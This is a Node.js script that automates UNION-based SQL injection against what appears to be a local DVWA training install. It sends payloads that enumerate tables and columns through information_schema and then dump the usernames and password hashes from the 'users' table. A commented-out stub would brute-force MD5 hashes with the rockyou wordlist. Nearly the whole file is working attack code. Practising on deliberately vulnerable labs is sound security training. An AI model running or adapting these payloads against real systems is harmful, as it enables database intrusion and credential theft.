const axios = require('axios');
const colors = require('colors');
const cheerio = require('cheerio');
const crypto = require('crypto');
const fs = require('fs');
 let options = {
     headers: {
       "Cookie": "security=low; __stripe_mid=37d68129-f74e-428b-90ce-72715d2b34fa; PHPSESSID=jl8h4o0kvofc4nji8okhbjpc4e",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"
 },
}
let url = "http://localhost:8080/DVWA-master/vulnerabilities/sqli/?id=%s&Submit=Submit"


function getTableName(url, payload) {
    axios.get(url.replace("%s", payload), options).then(res => {
        const html = res.data;
        const $ = cheerio.load(html);
        var data = cheerio.text($('pre'))
        console.log(data.replace("ID: 'union select 1,GROUP_CONCAT(0x0a,table_schema,':',table_name)FROM information_Schema.tables  -- -First name: 1Surname:" ," ").green.bold)
    
    })
}
function getColumnName(url, payload) {
    axios.get(url.replace("%s", payload), options).then(res => {
        const html = res.data;
        const $ = cheerio.load(html);
        var data = cheerio.text($('pre'))
        console.log(data.replace("ID: 1'union select 1,GROUP_CONCAT(0x0a,table_schema , ':',column_name)FROM information_Schema.columns where table_name = 'users'  -- -First name: adminSurname: adminID: 1'union select 1,GROUP_CONCAT(0x0a,table_schema , ':',column_name)FROM information_Schema.columns where table_name = 'users'  -- -First name: 1Surname:" ," ").green.bold)
    
    })
}
function getAllUser(url, payload) {
    axios.get(url.replace("%s", payload), options).then(res => {
        const html = res.data;
        const $ = cheerio.load(html);
        var data = cheerio.text($('pre'))
        console.log(data.replace("ID: 'union select 1,GROUP_CONCAT(0x0a,user) FROM users -- -First name: 1Surname:" ," ").green.bold)
    
    })
}
function getAllPassword(url, payload) {
    
    axios.get(url.replace("%s", payload), options).then(res => {
        const html = res.data;
        const $ = cheerio.load(html);
        var data =  cheerio.text($('pre')).replace("ID: 'union select 1,GROUP_CONCAT(0x0a,password) FROM users -- -First name: 1Surname:", " ")
        console.log(data.green.bold)
    })
}
// function BruteForce(passFile, passwordList) {}

getTableName(url, "'union select 1,GROUP_CONCAT(0x0a,table_schema,':',table_name)FROM information_Schema.tables  -- -")
getColumnName(url, "1'union select 1,GROUP_CONCAT(0x0a,table_schema , ':',column_name)FROM information_Schema.columns where table_name = 'users'  -- -")
getAllUser(url, "'union select 1,GROUP_CONCAT(0x0a,user) FROM users -- -")
getAllPassword(url , "'union select 1,GROUP_CONCAT(0x0a,password) FROM users -- -")


// BruteForce('../rockyou.txt',["5f4dcc3b5aa765d61d8327deb882cf99" , "e99a18c428cb38d5f260853678922e03"])
